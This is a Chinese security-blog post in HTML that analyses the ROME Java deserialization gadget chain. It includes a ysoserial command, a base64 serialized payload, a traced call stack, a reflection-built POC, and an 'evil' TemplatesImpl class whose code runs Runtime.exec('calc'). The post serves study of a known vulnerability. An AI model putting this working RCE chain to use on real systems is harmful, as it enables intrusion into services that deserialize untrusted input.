@@ -1,0 +1,419 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Rome反序列化链 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Rome反序列化链 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="环境搭建
+下载地址：http://rometools.github.io/rome/ROMEReleases/rome-1.0.jar，下载完以后导入rome包即可。
+我们可以先使用ysoserial生成payload，然后再下断点进行调试..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Rome反序列化链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="环境搭建">环境搭建</h1>
+<p>下载地址：http://rometools.github.io/rome/ROMEReleases/rome-1.0.jar，下载完以后导入rome包即可。</p>
+<p>我们可以先使用ysoserial生成payload，然后再下断点进行调试</p>
+<pre><code>java -jar ysoserial.jar ROME 'calc'|base64
+</code></pre>
+<pre><code class="language-java">package rome;
+
+import java.io.ByteArrayInputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.util.Base64;
+
+public class Test {
+    public static void main(String[] args) throws IOException,ClassNotFoundException {
+        String base64_exp = &quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVz&quot; +
+                &quot;aG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBs&quot; +
+                &quot;Lk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGlj&quot; +
+                &quot;YXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9z&quot; +
+                &quot;eW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9z&quot; +
+                &quot;dW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRp&quot; +
+                &quot;Y2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVy&quot; +
+                &quot;dGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5q&quot; +
+                &quot;YXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+&quot; +
+                &quot;AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxh&quot; +
+                &quot;dGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5&quot; +
+                &quot;dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGph&quot; +
+                &quot;dmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRp&quot; +
+                &quot;ZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAA&quot; +
+                &quot;AAaayv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25z&quot; +
+                &quot;dGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJs&quot; +
+                &quot;ZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5u&quot; +
+                &quot;ZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0&quot; +
+                &quot;UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5h&quot; +
+                &quot;bC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIv&quot; +
+                &quot;U2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUv&quot; +
+                &quot;eGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFj&quot; +
+                &quot;aGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0&quot; +
+                &quot;aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtM&quot; +
+                &quot;Y29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20v&quot; +
+                &quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot; +
+                &quot;ZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9E&quot; +
+                &quot;VE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVy&quot; +
+                &quot;bmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdl&quot; +
+                &quot;dHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJh&quot; +
+                &quot;bnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1&quot; +
+                &quot;bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9v&quot; +
+                &quot;cmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2Vy&quot; +
+                &quot;aWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUH&quot; +
+                &quot;ACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEABGNhbGMI&quot; +
+                &quot;ADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMK&quot; +
+                &quot;ACsANAEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXI0MDQwMDk3MzgyMzQxOTQBACBM&quot; +
+                &quot;eXNvc2VyaWFsL1B3bmVyNDA0MDA5NzM4MjM0MTk0OwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAAC&quot; +
+                &quot;AAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAA&quot; +
+                &quot;AAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAA&quot; +
+                &quot;AAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQA&quot; +
+                &quot;AAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0A&quot; +
+                &quot;AgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVX&quot; +
+                &quot;sQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AFwAAAdTK/rq+AAAA&quot; +
+                &quot;MgAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUF&quot; +
+                &quot;ceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxW&quot; +
+                &quot;YXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5&quot; +
+                &quot;bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsH&quot; +
+                &quot;ABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmpl&quot; +
+                &quot;Y3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdl&quot; +
+                &quot;dHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcA&quot; +
+                &quot;AbEAAAACAA0AAAAGAAEAAAA8AA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIA&quot; +
+                &quot;FgAQAAlwdAAEUHducnB3AQB4c3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLkVxdWFs&quot; +
+                &quot;c0JlYW71ihi75fYYEQIAAkwACl9iZWFuQ2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wABF9vYmpx&quot; +
+                &quot;AH4ACXhwdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHEAfgAU&quot; +
+                &quot;c3IAKmNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLlRvU3RyaW5nQmVhbgn1jkoPI+4xAgAC&quot; +
+                &quot;TAAKX2JlYW5DbGFzc3EAfgAcTAAEX29ianEAfgAJeHBxAH4AH3EAfgAUc3EAfgAbdnEAfgACcQB+&quot; +
+                &quot;AA1zcQB+ACBxAH4AI3EAfgANcQB+AAZxAH4ABnEAfgAGeA==&quot;;
+        byte[] exp =  Base64.getDecoder().decode(base64_exp);
+        ByteArrayInputStream bytes = new ByteArrayInputStream(exp);
+        ObjectInputStream objectInputStream = new ObjectInputStream(bytes);
+        objectInputStream.readObject();
+    }
+}
+</code></pre>
+<h1 id="前置知识">前置知识</h1>
+<h2 id="objectbean">ObjectBean</h2>
+<p><code>com.sun.syndication.feed.impl.ObjectBean</code>是<code>Rome</code>提供的一个封装类型, 初始化时提供了一个<code>Class</code>类型和一个<code>Object</code>对象实例进行封装</p>
+<p>他也有三个成员变量，分别是<code>EqualsBean</code>、 <code>ToStringBean</code>、<code>CloneableBean</code>类，为<code>ObjectBean</code>提供了<code>equals</code>、<code>toString</code>、<code>clone</code>以及<code>hashCode</code>方法</p>
+<p>在<code>ObjectBean#hashCode</code>中，调用了<code>EqualsBean</code>类的<code>beanHashCode</code>方法 ----出自https://xz.aliyun.com/t/11200</p>
+<h2 id="tostringbean">ToStringBean</h2>
+<p><code>com.sun.syndication.feed.impl.ToStringBean</code>是给对象提供<code>toString</code>方法的类, 类中有两个<code>toString</code>方法, 第一个是无参的方法, 获取调用链中上一个类或<code>_obj</code>属性中保存对象的类名, 并调用第二个<code>toString</code>方法. 在第二个<code>toString</code>方法中, 会调用<code>BeanIntrospector#getPropertyDescriptors</code>来获取<code>_beanClass</code>的所有<code>getter</code>和<code>setter</code>方法, 接着判断参数的长度, 长度等于<code>0</code>的方法会使用<code>_obj</code>实例进行反射调用, 通过这个点我们可以来触发<code>TemplatesImpl</code>的利用链. ----出自https://xz.aliyun.com/t/11200</p>
+<h1 id="调用链分析">调用链分析</h1>
+<p>调用栈如下</p>
+<pre><code>TemplatesImpl.getOutputProperties()
+NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
+NativeMethodAccessorImpl.invoke(Object, Object[])
+DelegatingMethodAccessorImpl.invoke(Object, Object[])
+Method.invoke(Object, Object...)
+ToStringBean.toString(String)
+ToStringBean.toString()
+ObjectBean.toString()
+EqualsBean.beanHashCode()
+ObjectBean.hashCode()
+
+HashMap&lt;K,V&gt;.hash(Object)
+HashMap&lt;K,V&gt;.readObject(ObjectInputStream)
+</code></pre>
+<p>最开始是由HashMap触发</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220505221836956.png" alt="image-20220505221836956" loading="lazy"></figure>
+<p>然后是调用了key的hashcode方法，在hashcode中调用的是EqualsBean的beanHashCode方法</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220505220028923.png" alt="image-20220505220028923" loading="lazy"></figure>
+<p>跟进beanHashCode方法。在EqualsBean调用了自身obj属性的toString方法，这里的obj属性是一个ObjectBean对象</p>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220505220149084.png" alt="image-20220505220149084" loading="lazy"></figure>
+<p>继续跟进toString方法，继续调用ToStringBean的toString方法，跟进</p>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220505220333091.png" alt="image-20220505220333091" loading="lazy"></figure>
+<p>其代码如下，运行结果最后prefix是TemplatesImpl</p>
+<pre><code class="language-java">public String toString() {
+    Stack stack = (Stack)PREFIX_TL.get();
+    String[] tsInfo = (String[])(stack.isEmpty() ? null : stack.peek());
+    String prefix;
+    if (tsInfo == null) {
+        String className = this._obj.getClass().getName();
+        prefix = className.substring(className.lastIndexOf(&quot;.&quot;) + 1);
+    } else {
+        prefix = tsInfo[0];
+        tsInfo[1] = prefix;
+    }
+
+    return this.toString(prefix);
+}
+</code></pre>
+<p>然后就调用了自身的toString方法，把TemplatesImpl作为参数传入，最终调用到pReadMethod.invoke(this._obj,NO_PARAMS)，从而触发精心构造的RCE</p>
+<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220505220756899.png" alt="image-20220505220756899" loading="lazy"></figure>
+<h1 id="利用链构造">利用链构造</h1>
+<p>开始说到，是从HashMap的readObject方法开始，通过触发key.hashcode方法触发，在结尾是调用到了ToStringBean的有参的toString方法，并且ToStringBean的_obj属性是TemplatesImpl对象,pds数组是获得ToStringBean类的_beanClass的getter和setter方法，并且方法需要无参才会进行反射调用。所以链的开始是HashMap#readObject，结尾是ToStringBean#toString。其中观察一下ObjectBean的构造函数，该构造函数是两个参数的构造函数，会调用自身三个参数的构造函数</p>
+<pre><code class="language-java">public ObjectBean(Class beanClass, Object obj) {
+    this(beanClass, obj, (Set)null);
+}
+</code></pre>
+<p>三参的构造函数如下</p>
+<pre><code class="language-java">public ObjectBean(Class beanClass, Object obj, Set ignoreProperties) {
+    this._equalsBean = new EqualsBean(beanClass, obj);
+    this._toStringBean = new ToStringBean(beanClass, obj);
+    this._cloneableBean = new CloneableBean(obj, ignoreProperties);
+}
+</code></pre>
+<p>可以看到，在初始化的时候，传入的beanClass和obj在EqualsBean和ToStringBean中分别都作为构造函数的参数传入。分别放上这两个Bean的对应的构造函数</p>
+<pre><code class="language-java">public EqualsBean(Class beanClass, Object obj) {
+    if (!beanClass.isInstance(obj)) {
+        throw new IllegalArgumentException(obj.getClass() + &quot; is not instance of &quot; + beanClass);
+    } else {
+        this._beanClass = beanClass;
+        this._obj = obj;
+    }
+}
+</code></pre>
+<pre><code class="language-java">protected ToStringBean(Class beanClass) {
+    this._beanClass = beanClass;
+    this._obj = this;
+}
+</code></pre>
+<p>我们可以知道在最后是寻找ToStringBean类的_beanClass的无参getter和setter方法，然后反射调用，并且在ToStringBean类的无参toString方法中，className是通过<code>className = this._obj.getClass().getName();</code>进行获取，prefix是截取className最后一个点之后的字符串，结果是TemplatesImpl,这里的话其实_beanClass就可以确定是javax.xml.transform.Templates的class对象,_obj就是TemplatesImpl对象，我们就可以来构造利用链了。</p>
+<p>所以poc如下</p>
+<pre><code class="language-java">package rome;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.syndication.feed.impl.EqualsBean;
+import com.sun.syndication.feed.impl.ObjectBean;
+
+import javax.xml.transform.Templates;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+
+public class POC {
+    public static void main(String[] args) throws Exception{
+        TemplatesImpl templates = new TemplatesImpl();
+        Class aClass = templates.getClass();
+        Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);
+        Field name = aClass.getDeclaredField(&quot;_name&quot;);
+        Field tfactory = aClass.getDeclaredField(&quot;_tfactory&quot;);
+        bytecodes.setAccessible(true);
+        name.setAccessible(true);
+        tfactory.setAccessible(true);
+        byte[] bytes= Files.readAllBytes(Paths.get(&quot;C:\\Users\\86155\\Desktop\\java\\untitled4\\target\\classes\\evil.class&quot;));
+        byte[][] bytes1=new byte[][]{bytes};
+        bytecodes.set(templates,bytes1);
+        name.set(templates,&quot;ch1e&quot;);
+        tfactory.set(templates,new TransformerFactoryImpl());
+        ObjectBean ch1e = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, &quot;ch1e&quot;));
+        HashMap hashMap = new HashMap();
+        hashMap.put(ch1e,&quot;ch1e&quot;);
+        ObjectBean objectBean = new ObjectBean(Templates.class, templates);
+        Class aClass1 = ObjectBean.class;
+        Field equalsBean = aClass1.getDeclaredField(&quot;_equalsBean&quot;);
+        equalsBean.setAccessible(true);
+        equalsBean.set(ch1e,new EqualsBean(ObjectBean.class, objectBean));
+        serialize(hashMap);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+<p>同时这里也是利用了TemplatesImpl，所以恶意类也需要继承AbstractTranslet，这里其实踩坑蛮久的，后面才想到</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+import java.io.IOException;
+
+public class evil extends AbstractTranslet {
+    static {
+        try {
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220505231339128.png" alt="image-20220505231339128" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">环境搭建</a></li>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a>
+<ul>
+<li><a href="#objectbean">ObjectBean</a></li>
+<li><a href="#tostringbean">ToStringBean</a></li>
+</ul>
+</li>
+<li><a href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90">调用链分析</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0">利用链构造</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/godzilla-webshell/">
+              <h3 class="post-title">
+                Godzilla Webshell
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
